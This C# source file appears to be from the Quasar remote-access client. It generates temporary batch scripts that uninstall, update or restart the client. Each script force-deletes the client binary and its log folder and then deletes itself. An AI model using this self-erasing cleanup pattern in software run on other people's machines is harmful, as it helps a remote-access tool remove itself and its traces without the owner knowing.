using Quasar.Common.Helpers;
using System;
using System.IO;
using System.Text;

namespace Quasar.Client.IO
{
    public class BatchFile
    {
        /// <summary>
        /// Creates the uninstall batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <param name="logDirectory">The log directory.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <code>string.Empty</code> on failure.</returns>
        public static string CreateUninstallBatch(string currentFilePath, string logDirectory)
        {
            try
            {
                string batchFile = FileHelper.GetTempFilePath(".bat");

                string uninstallBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                    "rmdir /q /s " + "\"" + logDirectory + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, uninstallBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Creates the update batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <param name="newFilePath">The new file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <code>string.Empty</code> on failure.</returns>
        public static string CreateUpdateBatch(string currentFilePath, string newFilePath)
        {
            try
            {
                string batchFile = FileHelper.GetTempFilePath(".bat");

                string updateBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "del /a /q /f " + "\"" + currentFilePath + "\"" + "\r\n" +
                    "move /y " + "\"" + newFilePath + "\"" + " " + "\"" + currentFilePath + "\"" + "\r\n" +
                    "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, updateBatch, new UTF8Encoding(false));
                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }

        /// <summary>
        /// Creates the restart batch file.
        /// </summary>
        /// <param name="currentFilePath">The current file path of the client.</param>
        /// <returns>The file path to the batch file which can then get executed. Returns <code>string.Empty</code> on failure.</returns>
        public static string CreateRestartBatch(string currentFilePath)
        {
            try
            {
                string batchFile = FileHelper.GetTempFilePath(".bat");

                string restartBatch =
                    "@echo off" + "\r\n" +
                    "chcp 65001" + "\r\n" +
                    "echo DONT CLOSE THIS WINDOW!" + "\r\n" +
                    "ping -n 10 localhost > nul" + "\r\n" +
                    "start \"\" " + "\"" + currentFilePath + "\"" + "\r\n" +
                    "del /a /q /f " + "\"" + batchFile + "\"";

                File.WriteAllText(batchFile, restartBatch, new UTF8Encoding(false));

                return batchFile;
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }
    }
}
